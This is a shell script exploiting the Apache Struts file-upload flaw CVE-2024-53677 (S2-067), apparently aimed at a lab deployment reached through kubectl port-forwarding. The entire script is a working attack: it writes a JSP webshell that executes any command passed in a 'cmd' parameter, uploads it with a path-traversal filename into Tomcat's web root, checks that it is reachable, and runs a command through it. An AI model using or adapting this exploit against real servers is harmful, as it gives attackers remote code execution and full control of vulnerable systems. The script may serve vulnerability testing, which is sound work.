#!/bin/sh
set -eu

# Struts CVE-2024-53677 (S2-067) File Upload Exploit
# Attacks the struts-cve-2024-53677 application via file upload vulnerability

namespace='struts-cve-2024-53677'
svc='struts-cve-2024-53677'
ports='8080:8080'
upload_endpoint="${1:-/upload.action}"
destination_path="${2:-../../../../../usr/local/tomcat/webapps/ROOT/shell.jsp}"
execute_command="${3:-whoami}"

echo "[ATTACK] Struts CVE-2024-53677 File Upload Exploit"
echo "[INFO] Namespace: $namespace"
echo "[INFO] Service: $svc"
echo "[INFO] Upload endpoint: $upload_endpoint"
echo "[INFO] Destination path: $destination_path"

# Create a simple JSP webshell
webshell_content='<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {
        out.println(line + "<br>");
    }
}
%>'

# Create temporary webshell file
webshell_file=$(mktemp)
echo "$webshell_content" > "$webshell_file"
echo "[INFO] Created webshell file: $webshell_file"

# Start port forwarding
echo "[INFO] Forwarding traffic to deployment..."
kubectl port-forward -n "$namespace" service/"$svc" "$ports" 2>/dev/null 1>&2 &
pid="$!"
sleep 5

# Generate random boundary for multipart form
boundary="----WebKitFormBoundary$(openssl rand -hex 8 2>/dev/null || echo $(date +%s))"

# Create multipart form data file
multipart_file=$(mktemp)
{
    echo "--$boundary"
    echo 'Content-Disposition: form-data; name="Upload"; filename="shell.jsp"'
    echo 'Content-Type: text/plain'
    echo ''
    echo "$webshell_content"
    echo "--$boundary"
    echo 'Content-Disposition: form-data; name="top.UploadFileName"'
    echo ''
    echo "$destination_path"
    echo "--$boundary--"
} > "$multipart_file"

# Upload the webshell file
echo "[ATTACK] Uploading webshell to $upload_endpoint..."
upload_response=$(curl -s -w "\n%{http_code}" \
    -X POST \
    -H "User-Agent: Mozilla/5.0" \
    -H "Content-Type: multipart/form-data; boundary=$boundary" \
    --data-binary "@$multipart_file" \
    "http://127.0.0.1:8080$upload_endpoint" 2>&1)

http_code=$(echo "$upload_response" | tail -n1)
response_body=$(echo "$upload_response" | sed '$d')

if [ "$http_code" = "200" ] || [ "$http_code" = "302" ] || [ "$http_code" = "201" ]; then
    echo "[SUCCESS] File uploaded successfully! HTTP $http_code"
    
    # Verify the uploaded file
    echo "[ATTACK] Verifying uploaded file..."
    verify_url="http://127.0.0.1:8080/shell.jsp"
    verify_response=$(curl -s -w "\n%{http_code}" "$verify_url")
    verify_code=$(echo "$verify_response" | tail -n1)
    
    if [ "$verify_code" = "200" ]; then
        echo "[SUCCESS] Webshell is accessible at $verify_url"
        
        # Execute command via webshell
        if [ -n "$execute_command" ]; then
            echo "[ATTACK] Executing command: $execute_command"
            cmd_url="$verify_url?cmd=$(echo "$execute_command" | sed 's/ /%20/g')"
            cmd_output=$(curl -s "$cmd_url")
            echo "[SUCCESS] Command output:"
            echo "$cmd_output"
        fi
    else
        echo "[INFO] Webshell verification returned HTTP $verify_code"
        echo "[INFO] Response: $(echo "$verify_response" | sed '$d' | head -c 200)"
    fi
else
    echo "[ERROR] Upload failed. HTTP $http_code"
    echo "[INFO] Response: $(echo "$response_body" | head -c 500)"
fi

# Cleanup
rm -f "$webshell_file" "$multipart_file"
kill "$pid" 2>/dev/null || true

echo "[COMPLETE] Attack finished!"

